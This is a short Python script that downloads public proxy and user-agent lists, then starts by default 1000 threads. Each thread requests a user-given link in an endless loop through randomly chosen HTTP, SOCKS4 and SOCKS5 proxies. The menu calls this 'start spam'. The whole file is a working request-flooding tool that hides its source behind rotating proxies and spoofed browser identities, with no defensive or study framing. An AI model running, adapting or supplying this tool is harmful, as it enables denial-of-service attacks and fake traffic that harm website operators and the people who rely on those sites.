import threading
import requests
import random

httpProxys = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt').text.split('\n')
socks4Proxys = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text.split('\n')
socks5Proxy = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt').text.split('\n')
userAgents = requests.get('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt').text.split('\n')
class requestBuilder:
        def __init__(self, grabberLink: str, timeoutTime = 30, siteProtocol = 'https'):
            self.link = grabberLink
            self.timeOut_ = int(timeoutTime)
            self.protocol = siteProtocol

        def getProxy(self):
            proxy = None
            color = ''
            proxyChoice = random.randint(0, 2)
            if (proxyChoice == 0):
                color = '\033[94m'
                proxy = {self.protocol: "http://" + random.choice(httpProxys)}

            elif (proxyChoice == 1):
                color = '\033[96m'
                proxy = {self.protocol: "socks4://" + random.choice(socks4Proxys)}

            elif (proxyChoice == 2):
                color = '\033[92m'
                proxy = {self.protocol: "socks5://" + random.choice(socks5Proxy)}

            print(color + str(proxy))
            return proxy

        def getUserAgent(self):
            return {'User-Agent': random.choice(userAgents)}

        def makeRequest(self):
            try:
                req = requests.get(self.link, proxies=self.getProxy(), headers=self.getUserAgent(), timeout=self.timeOut_)
            except Exception as e:
                #connection timeout
                #print(e)
                pass

        def requestLoop(self):
            while True:
                self.makeRequest()




started = False
settings = ['none', 30, 'https', 1000]
while (started == False):
    print('current settings:')
    print('-------------')
    print(f'1) link: {settings[0]}')
    print(f'2) proxy timeout time: {settings[1]}')
    print(f'3) website protocal (https/http/etc): {settings[2]}')
    print(f'4) threads to use to send requests: {settings[3]}')
    print('5) start spam')
    print('-------------')

    try:
        choice1 = int(input("setting to change > "))
        if (choice1 == 5):
            started = True
        else:
            change = input('new value > ')
            settings[int(choice1) - 1] = change
    except ValueError:
        print('has to be int')

for i in range(int(settings[3])):
    sender = requestBuilder(grabberLink=settings[0], timeoutTime=settings[1], siteProtocol=settings[2])
    test = threading.Thread(target=sender.requestLoop)
    test.start()